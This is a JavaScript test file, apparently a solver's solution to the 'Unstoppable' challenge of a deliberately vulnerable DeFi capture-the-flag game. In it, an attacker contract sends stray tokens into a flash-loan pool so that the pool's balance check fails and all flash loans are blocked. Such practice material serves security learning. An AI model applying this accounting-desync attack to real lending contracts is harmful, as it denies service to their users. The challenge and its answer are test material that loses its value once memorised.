const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
        await this.receiverContract.executeFlashLoan(10);
    });

    // it('Exploit - 1', async function () {
    //     /** CODE YOUR EXPLOIT HERE */
    //     // send excess tokens from attacker.address to pool
    //     await this.token.connect(attacker).transfer(this.pool.address, 1); // <- this needs to be sent from attacker contract
    // });

    it('Exploit - 2', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const AttackerContractFactory = await ethers.getContractFactory('AttackerContract', attacker);
        this.attackerContract = await AttackerContractFactory.deploy(this.pool.address);

        // send excess tokens from attacker.address to attackerContract
        await this.token.connect(attacker).transfer(this.attackerContract.address, 1); // <- this needs to be sent from attacker contract

        // then attackerContract will send those excess tokens to the pool
        // this will unbalance the poolBalance variable in pool contract and balance of pool in ERC20.balances

        await this.attackerContract.executeFlashLoan(10);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
